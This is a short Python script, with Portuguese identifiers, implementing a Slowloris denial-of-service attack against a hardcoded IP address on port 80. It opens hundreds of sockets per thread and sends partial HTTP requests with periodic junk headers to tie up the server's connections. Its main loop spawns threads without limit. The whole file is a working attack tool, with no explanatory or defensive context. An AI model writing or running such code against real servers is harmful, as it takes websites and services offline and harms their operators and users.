import socket
import random
import time
import threading

conexoes_sock = []
header = ["User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0", "Accept-language:en-US,en,q=0.5","Connection: Keep-Alive"]
qtd_threads = 215
n_threads = 0
ip = "172.21.209.231"


def start_sock():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect((ip, 80))
    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
    for h in header:
        s.send(bytes("{}\r\n".format(h).encode("utf-8")))
    return s

def slowloris():
    try:
        socks = list()
        for i in range(0, 500):
            try:
                a = start_sock()
                socks.append(a)
                print('socket: ' + str(i))
            except Exception as error:
                pass

        print('sockets criados')

        while True:

            for s in socks:
                try:
                    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
                    print('keep alive enviado')
                except:
                    print('conexao caiu')
                    try:
                        s = start_sock()
                    except:
                        pass

            time.sleep(2)

    except ConnectionRefusedError:
        slowloris()

def main():
    while True:
        th = threading.Thread(target=slowloris)
        th.start()


if __name__ == "__main__":
	main()

